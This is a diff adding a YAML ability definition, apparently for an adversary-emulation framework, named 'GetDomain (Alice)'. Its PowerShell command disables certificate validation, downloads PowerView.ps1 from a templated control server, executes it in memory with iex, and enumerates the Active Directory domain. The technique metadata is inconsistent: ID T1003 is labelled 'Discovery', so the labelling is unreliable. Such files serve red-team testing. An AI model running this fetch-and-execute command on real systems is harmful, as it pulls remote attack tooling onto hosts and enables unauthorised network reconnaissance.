@@ -1,0 +1,17 @@
+---
+
+- id: 6131397e-7765-424e-a594-3d7fb2d93a6a
+  name: GetDomain (Alice)
+  description:
+  tactic: discovery
+  technique:
+    attack_id: T1003
+    name: Discovery
+  executors:
+    psh:
+      command: |
+        [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $True }
+        $web = (New-Object System.Net.WebClient)
+        $web.Headers.add("file","PowerView.ps1")
+        $result = $web.uploadString("#{server}/file/download","")
+        iex $result; Get-NetDomain | ConvertTo-Json
